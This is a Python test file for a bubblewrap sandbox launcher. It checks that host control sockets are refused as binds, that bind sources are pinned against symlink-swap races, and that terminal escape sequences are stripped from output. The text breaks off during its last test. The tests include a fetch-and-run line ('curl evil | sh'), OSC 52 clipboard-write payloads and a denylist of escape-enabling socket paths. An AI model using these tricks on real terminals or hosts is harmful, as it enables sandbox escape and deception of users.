#!/usr/bin/env python3
"""Launcher-logic tests for sbox.py (bind validation and friends).

Run without any dependencies:   python3 tests/test_sandbox.py
or under pytest, if installed:  pytest tests/
"""
import argparse
import errno
import os
import shutil
import socket
import stat
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import sbox  # noqa: E402


def test_control_socket_binds_refused():
    """Binding a host control socket is a trivial full escape (docker/
    containerd = root, D-Bus/systemd = privileged services, X11 = input
    injection). They are only *children* of protected paths, which the
    covers() check deliberately allows (-b ~/proj must work), so they need
    their own rules: the CONTROL_SOCKETS denylist (with the same ancestor
    test, so parent dirs like -b /run/docker or -b ~/.gnupg are caught)
    plus the shape rule (anything under /run or any socket file)."""
    uid = os.getuid()
    refused = [
        # exact sockets
        "/run/docker.sock", "/var/run/docker.sock",
        "/run/podman/podman.sock",
        "/run/containerd/containerd.sock",
        "/run/crio/crio.sock",
        "/run/dbus/system_bus_socket",
        "/run/systemd/private",
        "/run/libvirt/libvirt-sock",
        "/run/snapd.socket", "/run/tailscale/tailscaled.sock",
        "/run/incus/unix.socket",
        "/tmp/.X11-unix", "/tmp/.X11-unix/X0",
        f"/run/user/{uid}/bus",
        f"/run/user/{uid}/gnupg/S.gpg-agent",
        f"/run/user/{uid}/pipewire-0",
        f"/run/user/{uid}/docker.sock",          # rootless daemons
        f"/run/user/{uid}/podman/podman.sock",
        f"/run/user/{uid}/systemd/private",
        f"/run/user/{uid}/keyring",              # gnome-keyring
        # parents of listed sockets (ancestor match, not exact)
        "/run/docker", "/run/dbus", "/run/libvirt", "/run/systemd",
        f"/run/user/{uid}/gnupg",
        # descendants of listed directories (bidirectional match — these
        # must be refused even via --bind-socket, the help promises it)
        f"/run/user/{uid}/keyring/ssh",
        "/run/podman/podman-run.sock",
        "/run/systemd/notify",
        f"/tmp/tmux-{uid}/ffmpeg.sock",
        "/tmp/.ICE-unix/1234",
        # shape rule: under /run even when not a known socket
        "/run/netns", "/run/myspeciald/control.sock",
    ]
    for path in refused:
        opts = argparse.Namespace(bind=[path], ro_bind=[], home=False,
                                  bind_socket=[])
        try:
            sbox.check_bind_paths(opts, "/home/sbox-test-user")
        except SystemExit:
            continue
        raise AssertionError(f"-b {path} was not refused")
    # ...and the bidirectional promise holds for --bind-socket too: a
    # descendant of a listed control-socket directory stays refused.
    for path in (f"/run/user/{uid}/keyring/ssh", "/run/podman/podman-run.sock"):
        opts = argparse.Namespace(bind=[], ro_bind=[], home=False,
                                  bind_socket=[path])
        try:
            sbox.check_bind_paths(opts, "/home/sbox-test-user")
        except SystemExit:
            continue
        raise AssertionError(f"--bind-socket {path} was not refused")


def test_bind_socket_opt_in():
    """--bind-socket is the explicit per-path opt-in for the shape rule
    (sockets, /run and friends) — but NOT for known control sockets or
    protected paths: those are never bindable."""
    def check(**kw):
        opts = argparse.Namespace(bind=kw.get("bind", []),
                                  ro_bind=kw.get("ro_bind", []),
                                  home=False,
                                  bind_socket=kw.get("bind_socket", []))
        return sbox.check_bind_paths(opts, "/home/sbox-test-user")

    def ident(path):
        st = os.stat(path)
        return (st.st_dev, st.st_ino)

    # A socket file that exists (real S_ISSOCK): refused via -b, allowed
    # via --bind-socket — mounted READ-ONLY (connect() works through a
    # ro-bind; rw would let the sandbox replace the socket file).
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        sock = os.path.join(tmp, "my.sock")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(sock)
        try:
            try:
                check(bind=[sock])
            except SystemExit:
                pass
            else:
                raise AssertionError("-b of a socket file was not refused")
            binds = check(bind_socket=[sock])
            assert binds == [("--ro-bind", sock, ident(sock))], binds
        finally:
            s.close()

    # Shape rule opt-in for a path that need not exist (also ro, no ident).
    binds = check(bind_socket=["/run/netns"])
    assert binds == [("--ro-bind", "/run/netns", None)], binds

    # Known control sockets stay refused even with --bind-socket...
    try:
        check(bind_socket=["/run/docker.sock"])
    except SystemExit:
        pass
    else:
        raise AssertionError("--bind-socket /run/docker.sock was allowed")
    # ...and so do protected paths.
    try:
        check(bind_socket=["/etc"])
    except SystemExit:
        pass
    else:
        raise AssertionError("--bind-socket /etc was allowed")

    # Ordinary children of non-protected trees must keep working
    # (realpath-resolved triples — the identity pins the validated inode
    # for the --bind-fd mount — are what build_bwrap mounts).
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        binds = check(bind=[tmp])
        rp = os.path.realpath(tmp)
        assert binds == [("--bind", rp, ident(rp))], binds


def test_bind_dir_socket_scan():
    """-b of a directory that CONTAINS a Unix socket is refused (bounded
    _contains_socket scan — closes the 'project dir with a dev-server
    socket' blind spot outside /run); --bind-socket opts in, and the scan
    stays cheap by bounding depth and entries."""
    def check(**kw):
        opts = argparse.Namespace(bind=kw.get("bind", []),
                                  ro_bind=kw.get("ro_bind", []),
                                  home=False,
                                  bind_socket=kw.get("bind_socket", []))
        return sbox.check_bind_paths(opts, "/home/sbox-test-user")

    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(os.path.join(tmp, "dev.sock"))
        try:
            try:
                check(bind=[tmp])
            except SystemExit:
                pass
            else:
                raise AssertionError("-b of a socket-bearing dir was not refused")
            # explicit opt-in; mounted read-only
            rp = os.path.realpath(tmp)
            binds = check(bind_socket=[tmp])
            st = os.stat(rp)
            assert binds == [("--ro-bind", rp, (st.st_dev, st.st_ino))], binds
        finally:
            s.close()
        # socket unlinked: the same dir binds normally again
        os.unlink(os.path.join(tmp, "dev.sock"))
        binds = check(bind=[tmp])
        assert len(binds) == 1 and binds[0][:2] == ("--bind", os.path.realpath(tmp)), binds
        # beyond max_depth the bounded scan deliberately gives up
        deep = tmp
        for d in range(sbox._contains_socket.__defaults__[0] + 1):
            deep = os.path.join(deep, f"d{d}")
        os.makedirs(deep)
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        deep_sock = os.path.join(deep, "deep.sock")
        s.bind(deep_sock)
        try:
            binds = check(bind=[tmp])
            assert len(binds) == 1 and binds[0][:2] == ("--bind", os.path.realpath(tmp)), binds
        finally:
            s.close()
            os.unlink(deep_sock)


def test_home_bind_exempt_and_warned():
    """-b $HOME --home re-binds what --home binds anyway: it must not die
    on the CONTROL_SOCKETS check (it used to, over ~/.1password/agent.sock,
    while plain --home bound the same tree silently). The risk is surfaced
    as a note instead — never silent, never fatal for the whole-home case.
    Narrow binds under $HOME keep being refused."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as fake_home:
        real = os.path.realpath(fake_home)
        agent = os.path.join(real, ".1password", "agent.sock")
        os.makedirs(os.path.dirname(agent), exist_ok=True)
        open(agent, "wb").close()
        saved = set(sbox.CONTROL_SOCKETS)
        sbox.CONTROL_SOCKETS.add(agent)
        try:
            # plain --home (no -b): warns (note printed above the PASS line)
            opts = argparse.Namespace(bind=[], ro_bind=[], home=True, bind_socket=[])
            assert sbox.check_bind_paths(opts, fake_home) == []
            # -b $HOME --home: exempt from the socket checks, still warns
            opts = argparse.Namespace(bind=[fake_home], ro_bind=[], home=True,
                                      bind_socket=[])
            binds = sbox.check_bind_paths(opts, fake_home)
            assert binds == [("--bind", real, sbox._path_ident(real))], binds
            # narrow bind of the socket itself: still refused, --home or not
            for home_flag in (True, False):
                opts = argparse.Namespace(bind=[agent], ro_bind=[],
                                          home=home_flag, bind_socket=[])
                try:
                    sbox.check_bind_paths(opts, fake_home)
                except SystemExit:
                    continue
                raise AssertionError(f"-b of control socket allowed (home={home_flag})")
        finally:
            sbox.CONTROL_SOCKETS.clear()
            sbox.CONTROL_SOCKETS.update(saved)


def test_persistence_binds_warned():
    """A read-write bind covering a known $HOME persistence path (shell rc
    files, authorized_keys, systemd user units, autostart, ~/.local/bin)
    is host code execution at next login — warned loudly, not refused;
    read-only binds and ordinary directories stay silent."""
    import contextlib
    import io
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as fake_home:
        os.makedirs(os.path.join(fake_home, ".config"))
        for name in (".bashrc", ".profile"):
            open(os.path.join(fake_home, name), "wb").close()

        def stderr_of(**kw):
            opts = argparse.Namespace(bind=kw.get("bind", []),
                                      ro_bind=kw.get("ro_bind", []),
                                      home=False, bind_socket=[])
            buf = io.StringIO()
            with contextlib.redirect_stderr(buf):
                sbox.check_bind_paths(opts, fake_home)
            return buf.getvalue()

        warned = stderr_of(bind=[os.path.join(fake_home, ".config")])
        assert "persistence" in warned and ".config/systemd/user" in warned, warned
        # exact file, umbrella -b of the home tree root children, and a
        # path whose ANCESTOR relationship goes the other way are covered
        assert "persistence" in stderr_of(bind=[os.path.join(fake_home, ".bashrc")])
        assert "authorized_keys" in stderr_of(bind=[os.path.join(fake_home, ".ssh")])
        # read-only is fine (planting requires write), unrelated paths and
        # XDG overrides resolve under the fake home
        assert "persistence" not in stderr_of(ro_bind=[os.path.join(fake_home, ".config")])
        assert "persistence" not in stderr_of(bind=[os.path.join(fake_home, "src")])


def test_open_path_pinned():
    """The TOCTOU closer: a component walk (openat O_PATH|O_NOFOLLOW,
    symlinks resolved only against pinned parents) that must match the
    inode validation saw. A naive realpath+open() would happily pin the
    attacker's substitution — that is exactly what this rejects."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        os.makedirs(f"{tmp}/a/b")
        open(f"{tmp}/a/b/target", "wb").write(b"x")
        st = os.stat(f"{tmp}/a/b/target")
        expect = (st.st_dev, st.st_ino)

        fd = sbox.open_path_pinned(f"{tmp}/a/b/target", expect)
        assert os.fstat(fd).st_ino == st.st_ino
        os.close(fd)

        # a legit symlink chain resolves to the validated target inode
        os.symlink(f"{tmp}/a/b/target", f"{tmp}/link")
        rp = os.path.realpath(f"{tmp}/link")
        fd = sbox.open_path_pinned(rp, sbox._path_ident(rp))
        assert os.fstat(fd).st_ino == st.st_ino
        os.close(fd)
        # relative symlink target with .. included
        os.makedirs(f"{tmp}/a/c", exist_ok=True)
        os.symlink("../b/target", f"{tmp}/a/c/rel")
        rp = os.path.realpath(f"{tmp}/a/c/rel")
        fd = sbox.open_path_pinned(rp, sbox._path_ident(rp))
        assert os.fstat(fd).st_ino == st.st_ino
        os.close(fd)

        # THE attack: swap a component for a symlink after validation.
        # realpath+open() pins the evil inode; the walk must refuse.
        os.makedirs(f"{tmp}/evil")
        open(f"{tmp}/evil/target", "wb").write(b"evil")
        validated = f"{tmp}/a/b/target"
        expect = sbox._path_ident(validated)
        os.rename(f"{tmp}/a/b", f"{tmp}/a/b_moved")
        os.symlink(f"{tmp}/evil", f"{tmp}/a/b")
        naive = os.open(os.path.realpath(validated), os.O_PATH | os.O_NOFOLLOW)
        assert os.fstat(naive).st_ino != expect[1]  # naive open WAS redirected
        os.close(naive)
        try:
            sbox.open_path_pinned(validated, expect)
        except ValueError as e:
            assert "swapped" in str(e), e
        else:
            raise AssertionError("component swap was not detected")

        # ENOENT (e.g. --bind-socket of a not-yet-created path) stays a
        # plain OSError so callers can fall back to the path form.
        try:
            sbox.open_path_pinned(f"{tmp}/nope", None)
        except OSError as e:
            assert e.errno == errno.ENOENT, e
        else:
            raise AssertionError("missing path pinned?!")

        # sockets pin too (--bind-socket through --ro-bind-fd)
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind(f"{tmp}/s.sock")
        try:
            fd = sbox.open_path_pinned(f"{tmp}/s.sock", sbox._path_ident(f"{tmp}/s.sock"))
            assert stat.S_ISSOCK(os.fstat(fd).st_mode)
            os.close(fd)
        finally:
            s.close()


def test_bind_pinner_mount_args():
    """build_bwrap hands pinnable sources (user binds, cwd, --home) to
    bwrap as --[ro-]bind-fd when a pinner is enabled, and keeps the plain
    path flags otherwise (old bwrap / unknown capabilities)."""
    def build(pinner, **kw):
        opts = argparse.Namespace(net=True, home=kw.get("home", False), gui=False,
                                  ssh_agent=False, ro_cwd=True,
                                  bind=kw.get("bind", []), ro_bind=[],
                                  bind_socket=[])
        binds = []
        for p in kw.get("bind", []):
            rp = os.path.realpath(p)
            binds.append(("--bind", rp, sbox._path_ident(rp)))
        out = sbox.build_bwrap(opts, "/tmp/sbox-test-sand", "/tmp/sbox-test-sock",
                               "/home/sbox-test-user", binds, None, None, pinner)
        return out[0]

    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        target = os.path.join(tmp, "proj")
        os.makedirs(target)
        oldcwd = os.getcwd()
        os.chdir(target)
        try:
            # no pinner (old bwrap): classic path flags
            bw = build(None, bind=[target])
            assert "--bind" in bw and "--ro-bind" in bw
            assert not any(a.endswith("-fd") for a in bw), bw
            # disabled pinner: same
            bw = build(sbox.BindPinner(enabled=False), bind=[target])
            assert "--bind" in bw and not any(a.endswith("-fd") for a in bw)

            # enabled pinner: every attacker-swappable mount goes by fd
            pinner = sbox.BindPinner(enabled=True)
            try:
                bw = build(pinner, bind=[target])
                assert "--ro-bind-fd" in bw, bw          # ro cwd mount
                assert "--bind-fd" in bw, bw             # rw user bind
                assert "--ro-bind" in bw                 # system trees stay path-based
                # the fd numbers must be real open fds (bwrap needs them)
                i = bw.index("--bind-fd")
                fd = int(bw[i + 1])
                assert os.fstat(fd).st_ino == os.stat(target).st_ino
                assert bw[i + 2] == os.path.realpath(target)  # dest unchanged
                # caches: one fd per source, the cwd and the bind both live
                assert set(pinner.fds) == {os.path.realpath(target)}
            finally:
                pinner.close()

            # --home with a SYMLINKED $HOME must pin the TARGET inode (the
            # raw path's lstat inode is the link's — a false "swapped").
            link_home = os.path.join(tmp, "home_link")
            real_home_dir = os.path.join(tmp, "home_real")
            os.makedirs(real_home_dir, exist_ok=True)
            if not os.path.lexists(link_home):
                os.symlink(real_home_dir, link_home)

            def build_home(pinner):
                opts = argparse.Namespace(net=True, home=True, gui=False,
                                          ssh_agent=False, ro_cwd=False,
                                          bind=[], ro_bind=[], bind_socket=[])
                return sbox.build_bwrap(opts, "/tmp/sbox-test-sand", "/tmp/sbox-test-sock",
                                        link_home, [], None, None, pinner)[0]

            pinner = sbox.BindPinner(enabled=True)
            try:
                bw = build_home(pinner)
                i = bw.index("--bind-fd")
                fd = int(bw[i + 1])
                assert os.fstat(fd).st_ino == os.stat(real_home_dir).st_ino
                assert bw[i + 2] == link_home            # dest = $HOME string
            finally:
                pinner.close()
        finally:
            os.chdir(oldcwd)


def test_bwrap_caps_probe():
    """Capability parsing from `bwrap --help` text — probed (not
    version-matched) so distro backports like 0.6.3 (--bind-fd) work."""
    p = sbox.parse_bwrap_caps
    # ancient: --seccomp only
    assert p("    --seccomp FD                 Load and use seccomp rules from FD\n"
             ) == {"seccomp": "--seccomp", "disable_userns": False, "bind_fd": False}
    # 0.8+: disable-userns + assert
    assert p(" --seccomp FD x\n --disable-userns             Disable\n"
             " --assert-userns-disabled     Fail unless\n"
             )["disable_userns"] is True
    # assert without disable must not pass as a pair
    assert p(" --seccomp FD x\n --assert-userns-disabled     Fail unless\n"
             )["disable_userns"] is False
    # current (0.10+): everything; --seccomp is still listed, prefer the
    # repeatable spelling
    caps = p(" --seccomp FD  old\n --add-seccomp-fd FD  new\n"
             " --disable-userns  x\n --assert-userns-disabled y\n"
             " --bind-fd FD DEST  a\n --ro-bind-fd FD DEST b\n")
    assert caps == {"seccomp": "--add-seccomp-fd", "disable_userns": True,
                    "bind_fd": True}
    # nothing at all (pre-0.4.1): seccomp unavailable -> callers fail closed
    assert p(" --bind SRC DEST\n")["seccomp"] is None
    # "--seccomp-fd" must not false-positive on "--seccomp"...
    assert p(" --seccomp-fd FD x\n")["seccomp"] is None
    if shutil.which("bwrap"):
        caps = sbox.bwrap_caps()
        assert caps.get("seccomp") in ("--seccomp", "--add-seccomp-fd"), caps


def test_allow_file_comments_and_blank_lines():
    """-A files promise '#' comments; comment-only and blank lines must be
    skipped (they used to abort the launcher with 'empty entry'), while
    genuinely bad entries still die with a file:line message."""
    with tempfile.TemporaryDirectory(prefix="sbox-test.") as tmp:
        path = os.path.join(tmp, "allows")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("# full-line comment\n"
                     "\n"
                     "example.com   # trailing comment\n"
                     "pypi.org:443\n")
        entries = sbox.load_allows([], [path])
        assert entries == [
            {"kind": "name", "value": "example.com", "port": None},
            {"kind": "name", "value": "pypi.org", "port": 443},
        ], entries
        with open(path, "a", encoding="utf-8") as fh:
            fh.write("not_a_host!!\n")
        try:
            sbox.load_allows([], [path])
        except SystemExit:
            pass
        else:
            raise AssertionError("invalid allow entry was accepted")


def test_bwrap_runs_payload_as_pid1():
    """--as-pid-1 must be in the bwrap argv: without it bwrap keeps an
    UNFILTERED zombie-reaper init as pid 1 inside the sandbox — the
    filtered command's PARENT — which on Yama ptrace_scope=0 systems can
    be /proc/1/mem-injected (the ptrace-syscall ban does not cover that)."""
    opts = argparse.Namespace(net=False, home=False, gui=False, ssh_agent=False,
                              ro_cwd=False, bind=[], ro_bind=[])
    bw, _inner = sbox.build_bwrap(opts, "/tmp/sbox-test-sand", "/tmp/sbox-test-sock",
                                  "/home/sbox-test-user", [], None, None)
    assert "--as-pid-1" in bw, "bwrap argv must run the payload as pid 1"
    assert "--unshare-all" in bw and "--die-with-parent" in bw


def test_split_argv_filter_output():
    """--filter-output is a valueless flag: split_argv must treat it as a
    single token so the sandboxed command is not mis-split."""
    assert sbox.split_argv(["--filter-output", "--", "echo", "hi"]) == \
        (["--filter-output"], ["echo", "hi"])
    assert sbox.split_argv(["--filter-output", "echo", "-v"]) == \
        (["--filter-output"], ["echo", "-v"])


# -------------------------------------------------- output sanitizer unit ---


def test_sanitizer_text_passthrough():
    """Plain printable text, \n \r \t and ordinary Unicode pass through
    untouched (decoding is UTF-8 with errors='replace')."""
    s = sbox.OutputSanitizer()
    data = "hello wörld 中文 emoji \U0001f680\na\tb\rc\n"
    out = s.feed(data.encode("utf-8"))
    assert out == data, repr(out)


def test_sanitizer_c0_c1_dropped():
    """C0 controls except \n \r \t, DEL and the whole C1 block (incl.
    U+009B CSI — which must NOT act as a sequence initiator) are
    dropped; surrounding text survives."""
    s = sbox.OutputSanitizer()
    out = s.feed(b"a\x00b\x07c\x08d\x0be\x0cf\x1fg\x7fh\xc2\x9bi\xc2\x85j\xc2\x9dk\n")
    assert out == "abcdefghijk\n", repr(out)


def test_sanitizer_strict_cr():
    """strict_cr=True drops every \r not immediately followed by \n: a
    bare \r moves the cursor to column 0, so payload output can visually
    overwrite the current line after you read it ("curl evil | sh\r" +
    "ok"). CRLF survives, lone \r (incl. \r\r and end-of-stream) is
    dropped, and sequences after a dropped \r still filter normally."""
    s = sbox.OutputSanitizer(strict_cr=True)
    assert s.feed(b"a\r\nb\rc\r\rd\r") + s.flush() == "a\r\nbcd", "strict"
    # the spoof: second half of the line overwrites the first visually
    s2 = sbox.OutputSanitizer(strict_cr=True)
    assert s2.feed(b"$ curl evil | sh\rok\r\n") == "$ curl evil | shok\r\n"
    # default mode keeps bare \r (progress bars depend on it)
    s3 = sbox.OutputSanitizer()
    assert s3.feed(b"a\rb\r\n") + s3.flush() == "a\rb\r\n"
    # a dropped \r does not eat the following escape sequence
    s4 = sbox.OutputSanitizer(strict_cr=True)
    assert s4.feed(b"X\r\x1b]52;c;Zm9v\ay\x1b[31mz\x1b[0m\r\n") == \
        "Xy\x1b[31mz\x1b[0m\r\n"
    # trailing \r held across a chunk boundary finds its \n later
    s5 = sbox.OutputSanitizer(strict_cr=True)
    assert s5.feed(b"end\r") == "end"
    assert s5.feed(b"\n!") == "\r\n!"


def test_sanitizer_bidi_zero_width_dropped():
    """Bidi overrides and zero-width/invisible characters deceive the
    reader (reverse rendering, hidden payloads) — dropped."""
    s = sbox.OutputSanitizer()
    evil = "a\u202eb\u200bc\u200bd\u2066e\u2060f\ufeffg\u2066h\u202di\n"
    assert s.feed(evil.encode("utf-8")) == "abcdefghi\n"
    # non-printable separators (NBSP) are dropped too: allowlist
    s2 = sbox.OutputSanitizer()
    assert s2.feed("a\u00a0b\n".encode()) == "ab\n"


def test_sanitizer_sgr_allowed():
    """Valid SGR color/style passes through verbatim: plain, empty
    (reset), multi-parameter, 256-color and truecolor forms."""
    payload = (b"\x1b[31mred\x1b[0m \x1b[m \x1b[1;32mx\x1b[0;1m \x1b[38;5;196m "
               b"\x1b[48;2;1;2;3m\n\x1b[92mbright\n")
    s = sbox.OutputSanitizer()
    assert s.feed(payload) == payload.decode(), repr(s.feed(payload))


def test_sanitizer_sgr_conceal_dropped():
    """SGR 8 (conceal/invisible text) is stripped — leading zeros and
    embedded positions included; the whole sequence is dropped rather
    than rewritten. 38/48 extended-color subparameters are NOT conceal
    ('38;5;8' selects color index 8) and must survive."""
    for seq in (b"\x1b[8m", b"\x1b[08m", b"\x1b[008m", b"\x1b[1;8m", b"\x1b[;8m",
                b"\x1b[0;8;31m", b"\x1b[38;5;196;8m"):
        s = sbox.OutputSanitizer()
        assert s.feed(seq + b"X") == "X", seq
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b[38;5;8mA\x1b[48;2;8;8;8mB") == "\x1b[38;5;8mA\x1b[48;2;8;8;8mB"


def test_sanitizer_sgr_length_cap():
    """The SGR parameter string must not exceed 64 characters — longer
    ones (even all-digits) are dropped."""
    s = sbox.OutputSanitizer()
    ok = b"\x1b[" + b"1;" * 31 + b"1m"          # 63 chars of params
    assert s.feed(ok) == ok.decode()
    s2 = sbox.OutputSanitizer()
    bad = b"\x1b[" + b"1;" * 32 + b"1m"          # 65 chars of params
    assert s2.feed(bad) == ""


def test_sanitizer_non_sgr_csi_dropped():
    """Every non-SGR CSI is dropped: cursor movement, screen clears,
    device status queries (answerback triggers), private-marked
    sequences, mode set/reset, colon subparameters."""
    payload = (b"A\x1b[2JB\x1b[5AC\x1b[cD\x1b[0cE\x1b[?25lF\x1b[>0cG\x1b[1;2H"
               b"H\x1b[hI\x1b[4hJ\x1b[38:5:196mK\n")
    s = sbox.OutputSanitizer()
    assert s.feed(payload) == "ABCDEFGHIJK\n", repr(s.feed(payload))


def test_sanitizer_strings_dropped():
    """OSC (titles, OSC 52 clipboard writes, OSC 8 hyperlinks — the link
    TEXT stays visible, its markup does not), DCS, APC, PM and SOS
    strings are dropped wholesale, terminated by BEL or ST (ESC \\)
    alike."""
    payload = (b"\x1b]0;title\x07A"
               b"\x1b]52;c;cGFzdGU=\x07B"
               b"\x1b]8;;http://evil.example\x1b\\link\x1b]8;;\x1b\\C"
               b"\x1bP+q544e\x1b\\D"
               b"\x1b_apc\x1b\\E"
               b"\x1b^pm\x1b\\F"
               b"\x1bXsos\x1b\\G\n")
    s = sbox.OutputSanitizer()
    assert s.feed(payload) == "ABlinkCDEFG\n", repr(s.feed(payload))


def test_sanitizer_esc_sequences_dropped():
    """2-byte ESC sequences (save/restore cursor, reverse LF, charset)
    and 3-byte intermediate forms (ESC ( B — ncurses emits these) are
    dropped without leaking their final byte as text."""
    s = sbox.OutputSanitizer()
    assert s.feed(b"A\x1bMB\x1b7C\x1b8D\x1b(BE\x1b)0F\x1b#8G\n") == "ABCDEFG\n"


def test_sanitizer_chunk_boundaries():
    """Partial sequences split across read() chunks are held back until
    complete: an SGR split three ways reassembles, a split multibyte
    character decodes once, and a stray ESC aborts a pending CSI."""
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b") == ""
    assert s.feed(b"[3") == ""
    assert s.feed(b"1mX") == "\x1b[31mX"
    s2 = sbox.OutputSanitizer()
    assert s2.feed(b"A\x1b]0;tit") == "A"
    assert s2.feed(b"le\x07B") == "B"
    s3 = sbox.OutputSanitizer()
    assert s3.feed(b"\xe4\xb8") == ""
    assert s3.feed(b"\xad") == "中"
    s4 = sbox.OutputSanitizer()
    assert s4.feed(b"\x1b[3\x1b[31mX") == "\x1b[31mX"


def test_sanitizer_unterminated_cap_and_flush():
    """An unterminated sequence is dropped past MAX_PENDING_SEQ bytes
    (bounded memory; following text flows again), CAN/SUB abort a
    pending sequence, and flush() drops a sequence that never
    terminated while finishing a partial multibyte as U+FFFD."""
    s = sbox.OutputSanitizer()
    out = s.feed(b"\x1b]" + b"A" * (sbox.MAX_PENDING_SEQ + 900) + b"visible\n")
    assert out.endswith("visible\n") and "\x1b" not in out
    s2 = sbox.OutputSanitizer()
    assert s2.feed(b"\x1b[31\x18X\n") == "X\n"          # CAN aborts the CSI
    s3 = sbox.OutputSanitizer()
    assert s3.feed(b"ok\x1b[31") == "ok"                # never terminated
    assert s3.flush() == ""
    s4 = sbox.OutputSanitizer()
    assert s4.feed(b"\xe4") == ""                       # split multibyte...
    assert s4.flush() == "\ufffd"                       # ...badly: replaced


def test_sanitizer_split_osc_terminators():
    """BEL-terminated OSC and ST-terminated OSC both end the drop, and
    an ESC inside a string that is NOT a ST (ESC \\) resumes string
    content instead of escaping the filter."""
    s = sbox.OutputSanitizer()
    assert s.feed(b"\x1b]0;a\x1b[31mbel-not-st\x07tail\n") == "tail\n"
    s2 = sbox.OutputSanitizer()
    assert s2.feed(b"\x1b]52;c;e\x1b\\ok\n") == "ok\n"


def test_copy_winsize_across_ptys():
    """_copy_winsize forwards TIOCGWINSZ->TIOCSWINSZ between real fds
    (the SIGWINCH forwarding path), rows/cols pixel fields included."""
    import fcntl
    import pty as pty_mod
    import struct
    import termios as termios_mod
    try:
        m1, s1 = pty_mod.openpty()
        m2, s2 = pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    try:
        fcntl.ioctl(s1, termios_mod.TIOCSWINSZ, struct.pack("HHHH", 47, 111, 3, 4))
        sbox._copy_winsize(s1, m2)
        ws = fcntl.ioctl(s2, termios_mod.TIOCGWINSZ, b"\x00" * 8)
        assert struct.unpack("HHHH", ws) == (47, 111, 3, 4), ws
    finally:
        for fd in (m1, s1, m2, s2):
            os.close(fd)


def test_sanitizer_pty_roundtrip():
    """End to end over a real pty pair (no bwrap needed): a child writes
    hostile output to the slave; the filtered master stream keeps text
    and SGR, drops the OSC 52 clipboard write. The slave's line
    discipline translates \n to \r\n (ONLCR) — both bytes are allowed."""
    import pty as pty_mod
    payload = (b"\x1b]52;c;c3RhbGUgdGhlIGNsaXBib2FyZA==\x07BEFORE "
               b"\x1b[31mred\x1b[0m AFTER\x1b[2J\n")
    try:
        master, slave = pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    import subprocess as sp
    proc = sp.Popen([sys.executable, "-c",
                     "import os,sys; os.write(1, sys.stdin.buffer.read())"],
                    stdin=sp.PIPE, stdout=slave, stderr=slave, close_fds=True)
    os.close(slave)
    proc.stdin.write(payload)
    proc.stdin.close()
    sanitizer = sbox.OutputSanitizer()
    chunks = []
    while True:
        try:
            data = os.read(master, 65536)
        except OSError:  # EIO: child exited, no slave fds left
            break
        if not data:
            break
        chunks.append(sanitizer.feed(data))
    rc = proc.wait()
    os.close(master)
    assert rc == 0
    out = "".join(chunks)
    assert "\x1b]52" not in out and "\x1b[2J" not in out, repr(out)
    assert "BEFORE \x1b[31mred\x1b[0m AFTER" in out.replace("\r\n", "\n"), repr(out)


def test_run_sandbox_filter_output_end_to_end():
    """The full --filter-output pipeline without real namespaces: a fake
    bwrap (skips its flags, execs the payload) still exercises the real
    run_sandbox — pty allocation, slave-only stdio, the select pump,
    filtering, drain and cleanup. Skips when ptys are unavailable. A
    real bwrap adds the namespaces on top; the host-side path is the
    same code."""
    import io
    import contextlib
    import signal
    import subprocess as sp
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
    with tf.TemporaryDirectory(prefix="sbox-test.") as tmp:
        shim = os.path.join(tmp, "bwrap")
        with open(shim, "w", encoding="utf-8") as fh:
            fh.write('#!/bin/sh\nwhile [ "$1" != "--" ]; do shift; done\nshift\nexec "$@"\n')
        os.chmod(shim, 0o755)
        # printf octal escapes only (\033, \a): dash's builtin is POSIX.
        command = ["/bin/sh", "-c", "printf 'hi\\033]52;c;Zm9v\\a\\033[31mred\\033[0m\\n'"]
        opts = argparse.Namespace(net=True, home=False, gui=False, ssh_agent=False,
                                  ro_cwd=True, bind=[], ro_bind=[], bind_socket=[],
                                  no_seccomp=True, verbose=False,
                                  filter_output=True)
        saved_path = os.environ["PATH"]
        # run_sandbox swaps signal handlers to SIG_IGN during cleanup:
        # keep the runner's handlers intact across the call.
        saved_sigs = {s: signal.getsignal(s) for s in
                      (signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGWINCH)}
        out = io.StringIO()
        devnull = open(os.devnull, "r")
        saved_stdin = sys.stdin
        try:
            os.environ["PATH"] = tmp + os.pathsep + saved_path
            # stdin from /dev/null: deterministic (the pump forwards
            # non-tty stdin; EOF becomes the pty's VEOF).
            sys.stdin = devnull
            with contextlib.redirect_stdout(out):
                rc = sbox.run_sandbox(opts, command, [], None)
        finally:
            sys.stdin = saved_stdin
            devnull.close()
            os.environ["PATH"] = saved_path
            for s, h in saved_sigs.items():
                signal.signal(s, h)
        assert rc == 0, rc
        # OSC 52 clipboard write stripped, SGR kept, \n ONLCR'd to \r\n
        # by the slave line discipline (both bytes allowed).
        assert out.getvalue() == "hi\x1b[31mred\x1b[0m\r\n", repr(out.getvalue())


def test_run_sandbox_filter_output_pipe_stdin():
    """Piped stdin must keep flowing under --filter-output (bwrap
    inherits it without the flag; the pump must forward it through the
    pty, with EOF delivered so canonical readers terminate), and the
    slave must not echo piped data back into the output."""
    import io
    import contextlib
    import signal
    import subprocess as sp
    import tempfile as tf
    import pty as pty_mod
    try:
        pty_mod.openpty()
    except OSError as e:
        raise unittest.SkipTest(f"no ptys available: {e}")
